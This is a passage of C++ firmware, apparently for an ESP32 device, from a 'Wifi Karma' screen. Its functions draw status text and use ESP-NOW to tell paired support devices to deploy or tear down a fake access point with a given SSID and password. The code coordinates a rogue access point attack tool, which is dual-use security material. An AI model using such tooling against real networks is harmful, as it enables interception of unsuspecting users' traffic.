      char moreBuf[16];
      snprintf(moreBuf, sizeof(moreBuf), "+%d more", _pairDeviceCount - 1);
      sp.drawString(moreBuf, bodyW() / 2, bodyH() / 2 + 28);
    }
  } else {
    sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
    sp.drawString("Waiting for support devices...", bodyW() / 2, bodyH() / 2 + 14);
  }

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}

// ── ESP-NOW send helpers ──────────────────────────────────────────────────────

void WifiKarmaScreen::_sendDeploy(const char* ssid, const char* pass)
{
  if (!esp_now_is_peer_exist(_supportMac)) {
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, _supportMac, 6);
    peer.channel = 1;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }
  KarmaMsg msg = {};
  memcpy(msg.magic, KARMA_ESPNOW_MAGIC, 4);
  msg.cmd = KARMA_DEPLOY;
  strncpy(msg.ssid, ssid, 32);
  strncpy(msg.password, pass, 63);
  esp_now_send(_supportMac, reinterpret_cast<uint8_t*>(&msg), sizeof(msg));
}

void WifiKarmaScreen::_sendTeardown()
{
  if (!_hasSupportDevice) return;
  if (!esp_now_is_peer_exist(_supportMac)) return;
  KarmaMsg msg = {};
  memcpy(msg.magic, KARMA_ESPNOW_MAGIC, 4);
  msg.cmd = KARMA_TEARDOWN;
  esp_now_send(_supportMac, reinterpret_cast<uint8_t*>(&msg), sizeof(msg));
}

void WifiKarmaScreen::_sendDone()
{
  if (!_hasSupportDevice) return;
  if (!esp_now_is_peer_exist(_supportMac)) return;
  KarmaMsg msg = {};
  memcpy(msg.magic, KARMA_ESPNOW_MAGIC, 4);
  msg.cmd = KARMA_DONE;
  esp_now_send(_supportMac, reinterpret_cast<uint8_t*>(&msg), sizeof(msg));
}

// ── ESP-NOW receive ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_onEspNowRecv(const uint8_t* mac, const uint8_t* data, int len)
{
  if (_instance) _instance->_handleEspNow(mac, data, len);
}

void WifiKarmaScreen::_handleEspNow(const uint8_t* mac, const uint8_t* data, int len)
{
  if (len < (int)sizeof(KarmaMsg)) return;
  const KarmaMsg* msg = reinterpret_cast<const KarmaMsg*>(data);
  if (memcmp(msg->magic, KARMA_ESPNOW_MAGIC, 4) != 0) return;

  switch (msg->cmd) {
    case KARMA_HELLO:
      if (_state == STATE_PAIR_SCAN && _pairDeviceCount < MAX_PAIR_DEVICES) {
        // Add device only if not already tracked
        bool known = false;
        for (int i = 0; i < _pairDeviceCount; i++) {
          if (memcmp(_pairDevices[i], mac, 6) == 0) { known = true; break; }
        }
        if (!known) {
          memcpy(_pairDevices[_pairDeviceCount], mac, 6);
          _pairDeviceCount++;
          _pairFound = true;
        }
      }
      break;
    case KARMA_ACK:
      if (_waitingForAck && msg->success) {
        portENTER_CRITICAL_ISR(&_espNowLock);
        memcpy(_ackBssid, msg->bssid, 6);
        _ackReceived = true;
        portEXIT_CRITICAL_ISR(&_espNowLock);
      }
      break;
    default: break;
  }
}

